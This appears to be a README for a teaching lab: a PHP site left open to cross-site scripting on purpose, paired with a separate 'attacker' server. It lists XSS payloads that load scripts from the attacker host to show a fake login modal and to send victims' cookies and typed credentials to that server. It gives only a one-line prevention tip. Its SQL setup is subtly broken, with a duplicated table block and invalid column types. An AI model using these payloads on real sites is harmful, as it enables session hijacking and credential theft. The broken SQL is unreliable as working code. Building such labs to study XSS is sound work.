# simple XSS vulnerable site

## To run
client server
```
php -S localhost:8000
```

attacker server
```
php -S 127.0.0.1:6969
```

## Covered situations
- [x] xss on comments
- [x] opens a loging modal and send user input to attacker server
- [x] sends cookies to attacker server
- [x] url xss
- [x] preventions

## XSS examples
- `simple input script`
- `<script src="http://127.0.0.1:6969/login.js"></script>`
- `<script src="http://127.0.0.1:6969/cookies.js"></script>`
- [notTested] `<img onerror="var s=document.createElement('script');s.src='http://127.0.0.1:6969/login.js';document.body.appendChild(s)"/>`

## Prevention
simply use `htmlspecialchars()`


## DB
create databases
```
CREATE DATABASE `xss`;
CREATE DATABASE `xss_attacker`;
```

create tables for xss
```
CREATE TABLE comments(
  name varchar(255),
  text varchar(255),
  created_at timestamp
);
```

create tables for xss
```
CREATE TABLE comments(
  name varchar(255),
  text varchar(255),
  created_at timestamp
);
```

create tables for attacker
```
CREATE TABLE users(
  name name(255),
  text password(255),
  created_at timestamp
);
CREATE TABLE cookies(
  name client(255),
  text content(255),
  created_at timestamp
);
```